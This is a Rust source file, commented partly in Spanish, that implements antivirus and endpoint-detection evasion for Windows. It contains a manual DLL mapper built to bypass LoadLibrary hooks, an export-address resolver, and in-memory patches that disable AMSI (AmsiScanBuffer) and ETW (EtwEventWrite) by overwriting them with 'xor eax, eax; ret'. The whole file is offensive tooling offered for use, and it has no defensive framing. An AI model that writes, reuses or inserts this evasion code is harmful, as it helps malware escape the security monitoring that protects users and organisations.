// Evasión avanzada para bypass AV/EDR
use std::ptr;
use std::mem;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};
use winapi::shared::minwindef::{LPVOID, DWORD};
use winapi::um::errhandlingapi::GetLastError;

#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    _padding: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct IMAGE_NT_HEADERS {
    signature: u32,
    file_header: IMAGE_FILE_HEADER,
    optional_header: IMAGE_OPTIONAL_HEADER,
}

#[repr(C)]
struct IMAGE_FILE_HEADER {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER {
    magic: u16,
    _padding1: [u8; 14],
    address_of_entry_point: u32,
    _padding2: [u8; 8],
    image_base: usize,
    _padding3: [u8; 12],
    size_of_image: u32,
    size_of_headers: u32,
    _padding4: [u8; 56],
}

#[repr(C)]
struct IMAGE_SECTION_HEADER {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _padding: [u8; 12],
    characteristics: u32,
}

#[repr(C)]
struct IMAGE_EXPORT_DIRECTORY {
    _padding1: [u8; 16],
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}



/// Manual DLL mapping (bypass LoadLibrary hooks)
pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
    // 1. Parse DOS header
    if dll_bytes.len() < mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err("DLL too small".to_string());
    }
    
    let dos_header = &*(dll_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D {  // "MZ"
        return Err("Invalid DOS header".to_string());
    }
    
    // 2. Parse NT headers
    let nt_headers_offset = dos_header.e_lfanew as usize;
    if dll_bytes.len() < nt_headers_offset + mem::size_of::<IMAGE_NT_HEADERS>() {
        return Err("Invalid NT headers offset".to_string());
    }
    
    let nt_headers = &*(dll_bytes.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS);
    if nt_headers.signature != 0x4550 {  // "PE\0\0"
        return Err("Invalid PE signature".to_string());
    }
    
    let image_size = nt_headers.optional_header.size_of_image as usize;
    let headers_size = nt_headers.optional_header.size_of_headers as usize;
    
    // 3. Allocate memory - SIMPLIFICADO: VirtualAlloc directo
    let base_addr = VirtualAlloc(
        ptr::null_mut(),
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    
    if base_addr.is_null() {
        let error_code = GetLastError();
        return Err(format!("VirtualAlloc failed: error code {}", error_code));
    }
    
    // 4. Copy headers
    ptr::copy_nonoverlapping(
        dll_bytes.as_ptr(),
        base_addr as *mut u8,
        headers_size,
    );
    
    // 5. Copy sections
    let section_header_offset = nt_headers_offset 
        + mem::size_of::<IMAGE_NT_HEADERS>()
        - mem::size_of::<IMAGE_OPTIONAL_HEADER>()
        + nt_headers.file_header.size_of_optional_header as usize;
    
    for i in 0..nt_headers.file_header.number_of_sections {
        let section = &*(dll_bytes.as_ptr().add(
            section_header_offset + i as usize * mem::size_of::<IMAGE_SECTION_HEADER>()
        ) as *const IMAGE_SECTION_HEADER);
        
        if section.size_of_raw_data > 0 {
            let dest = (base_addr as usize + section.virtual_address as usize) as *mut u8;
            let src = dll_bytes.as_ptr().add(section.pointer_to_raw_data as usize);
            
            ptr::copy_nonoverlapping(
                src,
                dest,
                section.size_of_raw_data as usize,
            );
        }
    }
    
    // 6. Make sections executable
    let mut old_protect: DWORD = 0;
    VirtualProtect(
        base_addr,
        image_size,
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );
    
    Ok(base_addr as LPVOID)
}

/// Obtener dirección de función exportada
pub unsafe fn get_export_address(base_addr: LPVOID, func_name: &str) -> Option<LPVOID> {
    let dos_header = &*(base_addr as *const IMAGE_DOS_HEADER);
    let nt_headers = &*((base_addr as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS);
    
    // Obtener export directory RVA (está en DataDirectory[0])
    let export_dir_rva_ptr = (base_addr as usize 
        + dos_header.e_lfanew as usize 
        + mem::size_of::<u32>()  // Signature
        + mem::size_of::<IMAGE_FILE_HEADER>()
        + 96) as *const u32;  // Offset to DataDirectory[0].VirtualAddress
    
    let export_dir_rva = *export_dir_rva_ptr;
    if export_dir_rva == 0 {
        return None;
    }
    
    let export_dir = &*((base_addr as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
    
    let names_rva = export_dir.address_of_names;
    let functions_rva = export_dir.address_of_functions;
    let ordinals_rva = export_dir.address_of_name_ordinals;
    
    let names = (base_addr as usize + names_rva as usize) as *const u32;
    let functions = (base_addr as usize + functions_rva as usize) as *const u32;
    let ordinals = (base_addr as usize + ordinals_rva as usize) as *const u16;
    
    // Buscar función por nombre
    for i in 0..export_dir.number_of_names {
        let name_rva = *names.add(i as usize);
        let name_ptr = (base_addr as usize + name_rva as usize) as *const i8;
        
        let mut j = 0;
        let mut match_found = true;
        let func_name_bytes = func_name.as_bytes();
        
        while *name_ptr.add(j) != 0 && j < func_name_bytes.len() {
            if *name_ptr.add(j) as u8 != func_name_bytes[j] {
                match_found = false;
                break;
            }
            j += 1;
        }
        
        if match_found && *name_ptr.add(j) == 0 && j == func_name_bytes.len() {
            let ordinal = *ordinals.add(i as usize);
            let func_rva = *functions.add(ordinal as usize);
            return Some((base_addr as usize + func_rva as usize) as LPVOID);
        }
    }
    
    None
}

/// AMSI bypass (patch AmsiScanBuffer)
pub unsafe fn bypass_amsi() -> bool {
    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
    
    let amsi_dll = b"amsi.dll\0";
    let h_amsi = LoadLibraryA(amsi_dll.as_ptr() as *const i8);
    if h_amsi.is_null() {
        return false;
    }
    
    let scan_buffer = b"AmsiScanBuffer\0";
    let p_amsi_scan = GetProcAddress(h_amsi, scan_buffer.as_ptr() as *const i8);
    if p_amsi_scan.is_null() {
        return false;
    }
    
    // Patch: xor eax, eax; ret
    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
    let mut old_protect: DWORD = 0;
    
    if VirtualProtect(
        p_amsi_scan as LPVOID,
        patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    ) == 0 {
        return false;
    }
    
    ptr::copy_nonoverlapping(
        patch.as_ptr(),
        p_amsi_scan as *mut u8,
        patch.len(),
    );
    
    VirtualProtect(
        p_amsi_scan as LPVOID,
        patch.len(),
        old_protect,
        &mut old_protect,
    );
    
    true
}

/// ETW bypass (patch EtwEventWrite)
pub unsafe fn bypass_etw() -> bool {
    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
    
    let ntdll = b"ntdll.dll\0";
    let h_ntdll = LoadLibraryA(ntdll.as_ptr() as *const i8);
    if h_ntdll.is_null() {
        return false;
    }
    
    let etw_event_write = b"EtwEventWrite\0";
    let p_etw = GetProcAddress(h_ntdll, etw_event_write.as_ptr() as *const i8);
    if p_etw.is_null() {
        return false;
    }
    
    // Patch: xor eax, eax; ret
    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
    let mut old_protect: DWORD = 0;
    
    if VirtualProtect(
        p_etw as LPVOID,
        patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    ) == 0 {
        return false;
    }
    
    ptr::copy_nonoverlapping(
        patch.as_ptr(),
        p_etw as *mut u8,
        patch.len(),
    );
    
    VirtualProtect(
        p_etw as LPVOID,
        patch.len(),
        old_protect,
        &mut old_protect,
    );
    
    true
}
